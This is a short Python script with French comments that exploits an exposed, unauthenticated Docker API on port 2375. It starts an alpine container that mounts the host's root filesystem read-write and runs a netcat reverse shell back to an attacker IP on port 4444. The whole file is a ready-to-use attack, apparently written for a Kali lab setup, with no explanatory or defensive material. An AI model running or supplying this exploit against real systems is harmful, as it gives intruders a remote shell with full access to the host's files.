import docker

IP_CIBLE = '192.168.1.81'  # IP du serveur Docker vulnérable
IP_ATTAQUANT = '192.168.1.79'  # VOTRE IP Kali - À CHANGER!

client = docker.DockerClient(base_url=f'http://{IP_CIBLE}:2375/')

# Méthode 1: Reverse shell immédiat (plus rapide)
print("[*] Tentative de reverse shell immédiat...")
try:
    data = client.containers.run(
        'alpine:latest',
        f'nc {IP_ATTAQUANT} 4444 -e /bin/sh',
        detach=True,
        remove=True,
        volumes={'/': {'bind': '/host', 'mode': 'rw'}}
    )
    print(f"[+] Container lancé: {data}")
except Exception as e:
    print(f"[-] Erreur: {e}")
